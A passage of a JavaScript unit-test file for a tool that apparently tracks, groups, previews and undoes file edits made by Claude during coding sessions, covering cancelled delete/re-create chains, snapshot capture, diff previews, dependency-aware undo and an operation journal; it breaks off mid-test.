test('groups: a file DELETED first and re-created later cancels out — the shape that shipped broken', () => {
  // The mirror of `cancel1`, and the one that reached a user. `runsOf` will not chain across a null
  // junction, so the run boundaries land one position off the natural pair; until the fold learned to
  // cross a create→delete cycle, the leading delete and trailing re-create were stranded as two
  // contradictory rows for a file nobody had touched.
  const S = 'cancel6';
  const F = twoAskStore(S);
  seedEdit(S, F, 'a\nb\nc\n', null); // ask 1: the file goes away
  seedEdit(S, F, null, 'a\nb\nc\n'); // ask 2: it comes back, byte-identical
  assert.equal(core.pendingGroups(S).size, 1, 'one decision, not two contradictory rows');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2]);
  assert.deepEqual([...core.cancelledGroups(S).keys()], [2], 'and it is marked cancelled');
});

test('groups: an alternating delete/create chain leaves NO row at all', () => {
  // The real session shape: eight records carrying ONE identical sha, produced by the Bash-capture
  // bug. Every one of them is noise. The whole chain must fold — a single stranded record at either
  // end is the reported defect.
  const S = 'cancel8';
  const F = twoAskStore(S);
  const text = 'x\ny\n';
  for (let i = 0; i < 4; i++) {
    seedEdit(S, F, text, null);
    seedEdit(S, F, null, text);
  }
  const units = core.reviewUnits(S, 'pending');
  assert.equal(units.filter((u) => !u.cancelled).length, 0, 'nothing is left to review');
  assert.equal(
    units.reduce((n, u) => n + u.recordIds.length, 0),
    8,
    'and every record is still accounted for — folded, never dropped'
  );
});

test('groups: deleted then re-created with DIFFERENT content is ONE unit showing the real diff', () => {
  // Absence is not a state anyone can review, so the two hops are one story. As two rows the first
  // claims a deletion of a file that still exists and the second a creation of one that was never
  // gone; merged, the pair is exactly `v0 → v1`.
  const S = 'cancel7';
  const F = twoAskStore(S);
  seedEdit(S, F, 'v0\n', null);
  seedEdit(S, F, null, 'v1\n');
  assert.equal(core.pendingGroups(S).size, 1, 'absence is not a unit boundary');
  assert.equal(core.cancelledGroups(S).size, 0, 'it is real work, so it is NOT dismissed as cancelled');
  const rows = core.reviewEdits(S).filter((r) => r.status === 'pending');
  assert.equal(rows.length, 1, 'one row');
  const d = core.lineDelta(S, rows[0]);
  assert.deepEqual([d.added, d.removed], [1, 1], 'reading as the true v0→v1 change, not +0 −1 then +1 −0');
});

// Pending EDIT rows the change map actually draws — the tree carries no rollup, so the count has to
// come from the same nodes a renderer walks.
function treePending(t) {
  let n = 0;
  const file = (f) => {
    for (const e of f.loose) if (e.status === 'pending') n++;
    for (const c of f.classes) for (const e of c.edits) if (e.status === 'pending') n++;
  };
  const folder = (fo) => {
    fo.files.forEach(file);
    fo.folders.forEach(folder);
  };
  t.files.forEach(file);
  t.folders.forEach(folder);
  return n;
}

test('groups: a REAL edit inside a phantom chain is never swallowed by the fold', () => {
  // The reason absence is merged rather than merely cancelled. A phantom delete, the file back, a
  // genuine edit, then the phantom pair again: cancelling on the null endpoints alone would mark the
  // whole run "nothing to review" and hide the real edit inside it — on the live session that buried
  // 63 Edit/Write records. Merging across absence leaves ONE unit carrying the real change instead.
  const S = 'cancel10';
  const F = twoAskStore(S);
  seedEdit(S, F, 'v0\n', null); // phantom delete
  seedEdit(S, F, null, 'v0\n'); // phantom re-create
  const real = seedEdit(S, F, 'v0\n', 'v1\n'); // …a genuine edit, in the middle
  seedEdit(S, F, 'v1\n', null); // phantom delete again
  seedEdit(S, F, null, 'v1\n'); // …and back
  const units = core.reviewUnits(S, 'pending');
  const owning = units.find((u) => u.recordIds.includes(real));
  assert.ok(owning, 'the real edit is in a unit');
  assert.equal(owning.cancelled, undefined, 'and that unit is NOT dismissed as cancelling out');
  const rows = core.reviewEdits(S).filter((r) => r.status === 'pending' && !core.cancelledMemberIds(S).has(r.id));
  assert.equal(rows.length, 1, 'exactly one row survives');
  const d = core.lineDelta(S, rows[0]);
  assert.deepEqual([d.added, d.removed], [1, 1], 'and it is the v0→v1 change the phantoms straddled');
});

test('groups: a dismissed cancelled chain stays hidden — Dismiss must not become thousands of grey rows', () => {
  // `cancelledGroups` answers the PENDING question, so hiding by it alone brought every dismissed
  // chain straight back as a resolved row. `cancelledMemberIds` (all statuses) is what surfaces hide.
  const S = 'cancel11';
  const F = twoAskStore(S);
  const a = seedEdit(S, F, 'a\nb\nc\n', null);
  const b = seedEdit(S, F, null, 'a\nb\nc\n');
  core.setStatusMany(S, [a, b], 'kept'); // …what Dismiss does
  const hidden = core.cancelledMemberIds(S);
  assert.ok(hidden.has(a) && hidden.has(b), 'both members stay hidden once decided');
  assert.equal(core.cancelledGroups(S).size, 0, 'and nothing is left for Dismiss to act on');
  assert.equal(treePending(core.buildEditTree(S, { root: path.dirname(F) })), 0, 'the change map shows no pending work for them');
});

test('counts: every surface means the same thing by "pending"', () => {
  // One meaning per word. Each of these used to count the raw or uncollapsed set, so a session could
  // read 652 in the status bar, 1,425 in the map and 132 in the list — all for the same edits.
  const S = 'cancel12';
  const F = twoAskStore(S);
  // A chain that genuinely cancels has to be on its OWN file: on the same file, the real edit below
  // would chain onto the re-create and the whole thing merges into one honest unit — which is right,
  // and which is why an earlier version of this fixture proved nothing (every filter it claimed to
  // cover stayed green when removed, because there was no cancelled record to exclude).
  const ghost = path.join(path.dirname(F), 'ghost.txt');
  const g1 = seedEdit(S, ghost, 'gone\n', null);
  const g2 = seedEdit(S, ghost, null, 'gone\n');
  const real = seedEdit(S, F, 'v0\n', 'v1\n'); // …and one real edit, elsewhere
  assert.deepEqual([...core.cancelledMemberIds(S)].sort((a, b) => a - b), [g1, g2],
    'the fixture really does contain a cancelled chain — otherwise this test proves nothing');
  const expected = 1;
  assert.equal(core.reviewSummary(S).pending, expected, 'reviewSummary');
  assert.equal(core.sessionMetrics(path.dirname(F), S).edits.pending, expected, 'sessionMetrics');
  assert.equal(core.sessionCounts(S).pending, expected, 'sessionCounts (the Sessions row)');
  assert.equal(treePending(core.buildEditTree(S, { root: path.dirname(F) })), expected, 'buildEditTree (the change map)');
  assert.ok(core.reviewUnits(S, 'pending').some((u) => u.recordIds.includes(real)), 'and the real edit is the one left');
});

test('rewind: a unit that spans an absent file reaches back — and the scope SAYS how far', () => {
  // The price of merging across absence, pinned so it stays a decision. A file deleted in ask 1 and
  // re-created in ask 2 is ONE unit (there is no reviewable state in between), and a unit is the
  // smallest thing that can be reverted — so "rewind to before ask 2" reverts ask 1's delete too,
  // or the file lands on content neither ask produced. `fromEarlier` is what makes that honest.
  const S = 'rewind-absent';
  const F = twoAskStore(S);
  seedEdit(S, F, 'x\n', null); // ask 1 deletes it
  seedEdit(S, F, null, 'z\n'); // ask 2 brings it back with new content
  const scope = core.checkpointScope(path.dirname(F), S, '2');
  assert.deepEqual(scope.ids, [1, 2], 'the whole unit is in scope — a half-reverted unit is not a state');
  assert.equal(scope.pending, 2, 'and both records really are reverted');
  assert.equal(scope.fromEarlier, 1, 'the record from the EARLIER ask is counted, not hidden');
  assert.equal(scope.units, 1, 'as one review unit');
});

test('groups: blob-less records never chain — an absent blob field is not a meeting point', () => {
  // Older stores (and fixtures) hold records with no blob on either side. They say nothing about
  // content, so they can neither cancel nor be crossed, and letting them meet would chain every one
  // of them into a single bogus unit. This is the guard the create→delete relaxation must not break.
  freshHome();
  const S = 'cancel9';
  const F = path.join(tmpWork(), 'a.ts');
  core.ensureStore(S);
  core.appendLog(S, { tool: 'Edit', file: F, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });
  core.appendLog(S, { tool: 'Edit', file: F, before: null, after: null, added: 2, removed: 0, status: 'pending', ts: 1300 });
  assert.equal(core.pendingGroups(S).size, 2, 'two records with no content are two units');
});

test('groups: cross-ask edits that do NOT cancel stay separate — the ask boundary still holds', () => {
  const S = 'cancel3';
  const F = twoAskStore(S);
  seedEdit(S, F, 'v0\n', 'v1\n');
  seedEdit(S, F, 'v1\n', 'v2\n'); // real work in the second ask
  assert.equal(core.pendingGroups(S).size, 2, 'two asks, two decisions — attribution is intact');
});

test('capture: overlapping Bash commands do not steal each other’s snapshots', () => {
  // THE bug behind "repeated reviews": one manifest per session meant a backgrounded command's Post
  // diffed its walk against whatever snapshot the NEXT command had just written. A repo-root walk
  // against a subtree snapshot reports every file outside that subtree as created; the mirror image
  // reports them deleted; and the partner then found no manifest and captured nothing at all.
  // Measured on the reporting session before the fix: 3,050 of 3,378 records sat in chains that
  // cancel out, and 3,211 of them came from Bash.
  freshHome();
  const S = 'overlap';
  core.ensureStore(S);
  const root = fs.realpathSync(tmpWork());
  const sub = path.join(root, 'sub');
  core.writeBashManifest(S, { files: { [path.join(root, 'keeper.txt')]: 'h1', [path.join(sub, 'b.txt')]: 'h2' }, ts: Date.now(), root });
  core.writeBashManifest(S, { files: { [path.join(sub, 'b.txt')]: 'h2' }, ts: Date.now(), root: sub });

  const forSub = core.takeBashManifest(S, sub);
  assert.deepEqual(Object.keys(forSub.files), [path.join(sub, 'b.txt')], 'the subtree command gets ITS snapshot');
  const forRoot = core.takeBashManifest(S, root);
  assert.equal(Object.keys(forRoot.files).length, 2, 'and the root command still finds its own');
  assert.equal(core.takeBashManifest(S, root), null, 'each is consumed exactly once');
});

test('capture: a pending Bash snapshot still protects its blobs from the reaper', () => {
  // The GC keyed on one well-known filename; per-command manifests must all be honoured or a blob a
  // command is mid-flight against gets collected and its undo is corrupt forever.
  freshHome();
  const S = 'gcman';
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('in flight\n'));
  core.writeBashManifest(S, { files: { '/w/f.txt': blob }, ts: Date.now(), root: '/w' });
  core.gcSession(S);
  assert.ok(core.hasBlob(S, blob), 'the pending snapshot keeps its before-blob alive');
});

test('capture: a root spelled with trailing separators still finds its own snapshot', () => {
  // Roots are matched as STRINGS, so the two hook events for one command have to normalize to the
  // same spelling. That trim used a `/[\\/]+$/` regex, which backtracks polynomially on a path of
  // many separators and takes its input from a hook payload — CodeQL rates it a ReDoS. It is a
  // backwards scan now; this pins the behaviour the scan has to keep.
  freshHome();
  const S = 'rootnorm';
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('x\n'));
  core.writeBashManifest(S, { files: { '/w/f.txt': blob }, ts: Date.now(), root: '/w///' });
  assert.ok(core.readBashManifest(S, '/w'), 'trailing separators do not strand the snapshot');
  assert.ok(core.readBashManifest(S, '/w/'), '…however the second event spells it');
  // …and the root separator itself is never trimmed away into an empty string.
  core.writeBashManifest(S, { files: { '/f.txt': blob }, ts: Date.now(), root: '/' });
  assert.ok(core.readBashManifest(S, '/'), 'the filesystem root is still a root');
});

test('preview: a huge diff is bounded to the budget, and says what it left out', () => {
  freshHome();
  const S = 'prev1';
  const F = path.join(tmpWork(), 'big.txt');
  const before = Array.from({ length: 500 }, (_, i) => `line ${i}`).join('\n') + '\n';
  const after = Array.from({ length: 500 }, (_, i) => `CHANGED ${i}`).join('\n') + '\n';
  const id = seedEdit(S, F, before, after);
  const rec = core.findRecord(S, id);
  const p = core.previewPair(S, rec, 50);
  // ONE hunk holds all 1,000 changed lines here — a budget that only stops between hunks would
  // never stop, which is exactly how the first version shipped a 13,083-line "preview".
  const changed = require('diff').diffLines(p.before, p.after).filter((c) => c.added || c.removed)
    .reduce((n, c) => n + c.count, 0);
  assert.ok(changed <= 50, `the preview honours the budget, got ${changed}`);
  assert.equal(p.omittedLines, 1000 - 50, 'and names exactly what is missing');
  for (const side of [p.before, p.after]) {
    assert.match(side, /preview of #\d+ from line \d+/, 'the head marker says where the window starts');
    assert.match(side, /more changed lines — open the full diff/, 'the tail marker says what is left');
  }
  // Markers must be IDENTICAL on both sides, or they render as a change Claude never made.
  const markers = (s) => s.split('\n').filter((l) => l.startsWith('⋯'));
  assert.deepEqual(markers(p.before), markers(p.after), 'markers are context, never a diff');
});

test('preview: a wholesale rewrite shows BOTH sides — the budget is spent half each', () => {
  freshHome();
  const S = 'prev3';
  const F = path.join(tmpWork(), 'rewrite.ts');
  const before = Array.from({ length: 400 }, (_, i) => `old ${i}`).join('\n') + '\n';
  const after = Array.from({ length: 400 }, (_, i) => `new ${i}`).join('\n') + '\n';
  const rec = core.findRecord(S, seedEdit(S, F, before, after));
  const p = core.previewPair(S, rec, 200);
  // A unified hunk lists every `-` before every `+`, so ONE running counter spends the whole budget
  // on removals: the preview then reads "−200 +0" for an edit the row calls +400 −400 — Claude
  // deleting a file and writing nothing. Both sides must be represented.
  let added = 0;
  let removed = 0;
  for (const c of require('diff').diffLines(p.before, p.after)) {
    if (c.added) added += c.count;
    if (c.removed) removed += c.count;
  }
  assert.ok(added > 0 && removed > 0, `both sides appear, got +${added} −${removed}`);
  assert.ok(added + removed <= 200, `and the budget still holds, got ${added + removed}`);
});

test('preview: diff metadata never becomes content ("\\ No newline at end of file")', () => {
  freshHome();
  const S = 'prev4';
  const F = path.join(tmpWork(), 'nonl.txt');
  // Neither side ends with a newline — jsdiff emits its marker line inside the hunk.
  const rec = core.findRecord(S, seedEdit(S,
    F,
    Array.from({ length: 20 }, (_, i) => `b${i}`).join('\n'),
    Array.from({ length: 20 }, (_, i) => `a${i}`).join('\n')));
  const p = core.previewPair(S, rec, 10);
  assert.ok(!p.before.includes('No newline') && !p.after.includes('No newline'),
    'a line that exists in neither blob must never be rendered inside a review diff');
});

test('preview: a diff inside the budget is passed through untouched — no markers, no window', () => {
  freshHome();
  const S = 'prev2';
  const F = path.join(tmpWork(), 'small.txt');
  const id = seedEdit(S, F, 'a\nb\nc\n', 'a\nB\nc\n');
  const rec = core.findRecord(S, id);
  const p = core.previewPair(S, rec, 200);
  assert.equal(p.omittedLines, 0);
  assert.equal(p.before, 'a\nb\nc\n', 'the real before');
  assert.equal(p.after, 'a\nB\nc\n', 'the real after');
});

test('groups: undoGroup is ONE merge — the unit reverts whole, members flip in one batch', () => {
  const home = freshHome();
  const S = 'unet';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L0\nL1\nL2\nL3\nL4\n', 'A\nL1\nL2\nL3\nL4\n'); // #1 line 0
  seedEdit(S, F, 'A\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nL4\n'); // #2 line 0 (unit with #1)
  seedEdit(S, F, 'B\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nX\n'); // #3 line 4 (separate unit, later)
  fs.writeFileSync(F, 'B\nL1\nL2\nL3\nX\n');
  const res = core.undoGroup(S, 2);
  assert.equal(res.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'L0\nL1\nL2\nL3\nX\n', "the unit's region reverts; the later edit stays");
  assert.equal(core.findRecord(S, 3).status, 'pending');
  const ops = fs
    .readFileSync(path.join(home, '.claude', 'claude-observatory', S, 'log.jsonl'), 'utf8')
    .trim().split('\n').map((l) => JSON.parse(l)).filter((o) => o.op === 'status');
  assert.deepEqual(ops.map((o) => o.id).sort((a, b) => a - b), [1, 2], 'one status op per member, none doubled');
  // The DISCRIMINATING one-batch witness: the member-by-member engine journaled nothing (each
  // member flipped through the singular setStatus); the one-merge engine flips through setStatusMany,
  // which journals the pair as ONE batch op. (A shared-ts assertion was tried first and proven weak —
  // two per-member appends land in the same millisecond essentially always.)
  const journaled = core.readOperations(S);
  assert.equal(journaled.length, 1, 'the unit flip is journaled once, as a batch');
  assert.deepEqual(journaled[0].ids, [1, 2]);
});

test('groups: undoing a create-then-delete unit NEVER unlinks a file it did not capture', () => {
  freshHome();
  const S = 'cdel';
  const F = path.join(tmpWork(), 'ghost.txt');
  seedEdit(S, F, null, 'tmp\n'); // #1 create
  seedEdit(S, F, 'tmp\n', null); // #2 delete — one unit: the delete rewrites the create's lines
  assert.deepEqual(core.groupMembers(S, 2), [1, 2], 'create+delete collapse to one unit');
  fs.writeFileSync(F, 'THE USERS FILE\n'); // someone else's file at that path — captured in NO blob
  const res = core.undoGroup(S, 2);
  assert.equal(res.status, 'conflict', 'a file we never captured is never deleted');
  assert.equal(fs.readFileSync(F, 'utf8'), 'THE USERS FILE\n');
  assert.equal(core.findRecord(S, 1).status, 'pending');
  fs.unlinkSync(F);
  const res2 = core.undoGroup(S, 2); // absent: the undo is a pure ledger flip
  assert.equal(res2.ok, true, res2.message);
  assert.equal(core.findRecord(S, 1).status, 'undone');
  assert.ok(!fs.existsSync(F));
  fs.writeFileSync(F, 'SQUATTER\n'); // redo of the both-null unit: never fabricate "" over a squatter
  const res3 = core.redoGroup(S, 2);
  assert.equal(res3.status, 'conflict');
  assert.equal(fs.readFileSync(F, 'utf8'), 'SQUATTER\n');
  fs.unlinkSync(F);
  const res4 = core.redoGroup(S, 2);
  assert.equal(res4.ok, true, res4.message);
  assert.ok(!fs.existsSync(F), 'the net effect of the unit is "no file"');
  assert.equal(core.findRecord(S, 2).status, 'pending');
});

test('groups: a conflicting undoGroup leaves DISK untouched and EVERY member pending — no half-revert', () => {
  freshHome();
  const S = 'uconf';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #1
  seedEdit(S, F, 'L1\nB\nL3\n', 'L1\nC\nL3\n'); // #2 — one unit with #1
  fs.writeFileSync(F, 'L1\nMANUAL\nL3\n'); // a manual change on the unit's own line
  const res = core.undoGroup(S, 2);
  assert.equal(res.status, 'conflict');
  assert.equal(fs.readFileSync(F, 'utf8'), 'L1\nMANUAL\nL3\n', 'disk untouched');
  assert.equal(core.findRecord(S, 1).status, 'pending', 'no member was half-reverted');
  assert.equal(core.findRecord(S, 2).status, 'pending');
});

test('groups: a create-chain unit undoes as one unlink, guarded by the current content', () => {
  freshHome();
  const S = 'ucreate';
  const F = path.join(tmpWork(), 'new.txt');
  seedEdit(S, F, null, 'a\n'); // #1 create
  seedEdit(S, F, 'a\n', 'b\n'); // #2 same-line edit — one unit with #1 (net: null -> 'b\n')
  assert.deepEqual(core.groupMembers(S, 2), [1, 2], 'the create chains into the unit');
  fs.writeFileSync(F, 'x\n'); // drifted content: the guard must refuse rather than delete
  const guard = core.undoGroup(S, 2);
  assert.equal(guard.status, 'conflict', 'a drifted file is never deleted');
  assert.ok(fs.existsSync(F));
  assert.equal(core.findRecord(S, 1).status, 'pending');
  fs.writeFileSync(F, 'b\n'); // back at the unit's net after
  const res = core.undoGroup(S, 2);
  assert.equal(res.status, 'deleted');
  assert.ok(!fs.existsSync(F), 'undoing the whole unit removes the file it created');
  assert.equal(core.findRecord(S, 1).status, 'undone');
  assert.equal(core.findRecord(S, 2).status, 'undone');
  const r = core.redoGroup(S, 2);
  assert.equal(r.status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'b\n', 'redo recreates the file at the unit net after');
});

test('deps: a later unit rewriting lines an earlier unit produced DEPENDS on it — across asks', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'dep1';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'ask one'), line(1500, 'ask two')].join('\n') + '\n');
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'L1\nA0\nL3\n', 'L1\nA1\nL3\n'); // #1 ts1000, ask 1
  core.setStatus(S, 1, 'kept');
  seedEdit(S, F, 'L1\nA1\nL3\n', 'L1\nA2\nL3\n'); // #2 ts2000, ask 2 — rewrites #1's line
  assert.deepEqual(core.groupMembers(S, 2), [2], 'across asks the units stay separate');
  assert.deepEqual(core.unitDeps(S).get(2), [1], '#2 rewrote a line #1 produced');
  assert.deepEqual(core.unitDependents(S, 1), [2]);
  assert.deepEqual(core.unitDependents(S, 2), [], 'and never the reverse');
});

test('deps: independent regions draw no edge, even adjacent in the chain', () => {
  freshHome();
  const S = 'dep2';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L0\nL1\nL2\nL3\nL4\n', 'A\nL1\nL2\nL3\nL4\n'); // #1 line 0
  seedEdit(S, F, 'A\nL1\nL2\nL3\nL4\n', 'A\nL1\nL2\nL3\nX\n'); // #2 line 4 — different region
  assert.equal(core.pendingGroups(S).size, 2);
  assert.equal(core.unitDeps(S).size, 0, 'no line of one was produced by the other');
});

test('deps: an external write between two units breaks attribution — no edge', () => {
  freshHome();
  const S = 'dep3';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #1
  seedEdit(S, F, 'L1\nEXT\nL3\n', 'L1\nC\nL3\n'); // #2 — before ≠ #1.after: something else intervened
  assert.equal(core.unitDeps(S).size, 0, 'nothing is attributable across content we did not produce');
});

test('deps: ancestry is DIRECT — C→B and B→A, never C→A', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'dep4';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'one'), line(1500, 'two'), line(2500, 'three')].join('\n') + '\n');
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'L1\nX\nL3\n', 'L1\nA\nL3\n'); // #1 ask 1
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #2 ask 2 — rewrites #1's line
  seedEdit(S, F, 'L1\nB\nL3\n', 'L1\nC\nL3\n'); // #3 ask 3 — rewrites #2's line
  const deps = core.unitDeps(S);
  assert.deepEqual(deps.get(2), [1]);
  assert.deepEqual(deps.get(3), [2], 'the line #3 touched belongs to #2 now, not #1');
  assert.equal(deps.size, 2, 'no transitive C→A edge is stored');
});

test('deps: a conflicted undo NAMES its dependents and offers the closure', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'dep5';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'one'), line(1500, 'two')].join('\n') + '\n');
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'L1\nA0\nL3\n', 'L1\nA1\nL3\n'); // #1 ask 1
  seedEdit(S, F, 'L1\nA1\nL3\n', 'L1\nA2\nL3\n'); // #2 ask 2 — depends on #1
  fs.writeFileSync(F, 'L1\nA2\nL3\n');
  const res = core.undoGroup(S, 1);
  assert.equal(res.status, 'conflict');
  assert.deepEqual(res.dependents, [2], 'the refusal names the depending unit');
  assert.deepEqual(res.closure, [2, 1], 'and carries the one-call closure, newest first');
  assert.ok(res.message.includes('unit #2') && res.message.includes('undo --ids 2,1'), res.message);
  assert.equal(fs.readFileSync(F, 'utf8'), 'L1\nA2\nL3\n', 'disk untouched');
  const bulk = core.undoScope(S, { ids: res.closure }); // the suggested closure actually resolves it
  assert.equal(bulk.undone, 2);
  assert.equal(fs.readFileSync(F, 'utf8'), 'L1\nA0\nL3\n');
});

test('deps: a conflict from a MANUAL change carries no dependents and keeps the original wording', () => {
  freshHome();
  const S = 'dep6';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n');
  fs.writeFileSync(F, 'L1\nMANUAL\nL3\n');
  const res = core.undoEdit(S, 1);
  assert.equal(res.status, 'conflict');
  assert.equal(res.dependents, undefined, 'no dependent unit — no invented edge');
  assert.match(res.message, /overlaps a later change to f\.txt/);
});

test('deps: a kept dependent withholds the closure — the suggested command must actually work', () => {
  freshHome();
  const S = 'dep7';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nX\nL3\n', 'L1\nA\nL3\n'); // #1 pending — the undo target
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #2 rewrites #1's line, then is ACCEPTED
  core.setStatus(S, 2, 'kept');
  fs.writeFileSync(F, 'L1\nB\nL3\n');
  const res = core.undoGroup(S, 1);
  assert.equal(res.status, 'conflict');
  assert.deepEqual(res.dependents, [2], 'the kept dependent is still NAMED');
  assert.equal(res.closure, undefined, 'but no one-call closure — undo --ids reverts pending only');
  assert.match(res.message, /already accepted/);
});

test('deps: an undone dependent is no dependent at all — the original wording returns', () => {
  freshHome();
  const S = 'dep8';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nX\nL3\n', 'L1\nA\nL3\n'); // #1 pending
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #2 rewrote the line, then was undone
  core.setStatus(S, 2, 'undone');
  fs.writeFileSync(F, 'L1\nMANUAL\nL3\n'); // the conflict source is a manual change
  const res = core.undoGroup(S, 1);
  assert.equal(res.status, 'conflict');
  assert.equal(res.dependents, undefined, 'work that is no longer applied is not a dependent');
  assert.match(res.message, /overlaps a later change/);
});

test('deps: a bulk revert carries the first conflict MESSAGE — the named refusal reaches bulk readers', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'dep9';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  // Two asks: without the boundary the chained pair is ONE unit and no cross-unit edge exists.
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'one'), line(1500, 'two')].join('\n') + '\n');
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'L1\nX\nL3\n', 'L1\nA\nL3\n'); // #1 pending, ask 1
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #2 pending, ask 2 — depends on #1
  fs.writeFileSync(F, 'L1\nB\nL3\n');
  const bulk = core.undoScope(S, { ids: [1] }); // scoped to the depended-on unit alone
  assert.equal(bulk.conflicts, 1);
  assert.match(bulk.firstConflict, /unit #2 depends on it/);
});

test('oplog: a bulk keep journals a batch op with before-images, and revertOperation restores them', () => {
  freshHome();
  assert.deepEqual(core.readOperations('never-seeded'), [], 'an empty store answers an empty list');
  const S = 'op1';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n'); // #1
  seedEdit(S, F, 'b\n', 'c\n'); // #2 — one unit with #1
  core.keepGroup(S, 1);
  const ops = core.readOperations(S);
  assert.equal(ops.length, 1, 'one journaled operation for the bulk keep');
  assert.equal(ops[0].kind, 'keep');
  assert.deepEqual(ops[0].ids, [1, 2]);
  assert.deepEqual(ops[0].prev, { 1: 'pending', 2: 'pending' });
  assert.match(ops[0].label, /kept 2 edit/);
  const res = core.revertOperation(S, ops[0]);
  assert.equal(res.restored, 2);
  assert.equal(core.findRecord(S, 1).status, 'pending');
  assert.equal(core.findRecord(S, 2).status, 'pending');
  // The revert flows back through setStatusMany, so it is journaled too — reverting twice round-trips.
  assert.equal(core.readOperations(S).length, 2);
});

test('oplog: the journal is invisible to readLog and survives a log rewrite', () => {
  freshHome();
  const S = 'op2';
  const dir = tmpWork();
  seedEdit(S, path.join(dir, 'a.txt'), 'a\n', 'b\n');
  seedEdit(S, path.join(dir, 'b.txt'), 'x\n', 'y\n');
  core.setStatusMany(S, [1, 2], 'kept');
  assert.equal(core.readLog(S).length, 2, 'the batch op line is a control line, not a record');
  core.clearResolved(S);
  assert.equal(core.readLog(S).length, 0, 'the kept records were compacted away');
  assert.equal(core.readOperations(S).length, 1, 'the journal survived the rewrite');
});

test('oplog: reverting a bulk undo REWRITES the files, not just the ledger', () => {
  freshHome();
  const S = 'op3';
  const dir = tmpWork();
  const F = path.join(dir, 'a.txt');
  const G = path.join(dir, 'b.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  seedEdit(S, G, 'x\n', 'y\n');
  fs.writeFileSync(F, 'b\n');
  fs.writeFileSync(G, 'y\n');
  const bulk = core.undoScope(S, {});
  assert.equal(bulk.undone, 2);
  assert.equal(fs.readFileSync(F, 'utf8'), 'a\n');
  const last = core.readOperations(S)[0];
  assert.equal(last.kind, 'undo');
  const res = core.revertOperation(S, last);
  assert.equal(res.result.redone, 2);
  assert.equal(fs.readFileSync(F, 'utf8'), 'b\n', 'the file came back, byte-identical');
  assert.equal(fs.readFileSync(G, 'utf8'), 'y\n');
  assert.equal(core.findRecord(S, 1).status, 'pending');
});

test('oplog: a single flip journals nothing — the journal is for BULK actions', () => {
  freshHome();
  const S = 'op5';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  fs.writeFileSync(F, 'b\n');
  core.undoEdit(S, 1);
  assert.equal(core.findRecord(S, 1).status, 'undone');
  assert.deepEqual(core.readOperations(S), [], 'one edit is cheap to reverse by hand');
});

test('oplog: reverting a revert of a KEEP stays ledger-only — disk untouched, statuses back to kept', () => {
  freshHome();
  const S = 'op4';
  const dir = tmpWork();
  const F = path.join(dir, 'a.txt');
  const G = path.join(dir, 'b.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  seedEdit(S, G, 'x\n', 'y\n');
  fs.writeFileSync(F, 'b\n');
  fs.writeFileSync(G, 'y\n');
  core.setStatusMany(S, [1, 2], 'kept');
  core.revertOperation(S, core.readOperations(S)[0]); // un-keep: statuses back to pending
  assert.equal(core.findRecord(S, 1).status, 'pending');
  const second = core.revertOperation(S, core.readOperations(S)[0]); // revert the revert
  assert.equal(second.restored, 2, 'a ledger-only op reverts as a ledger-only op');
  assert.equal(second.result, undefined, 'no scoped disk verb ran');
  assert.equal(core.findRecord(S, 1).status, 'kept', 'back where it started');
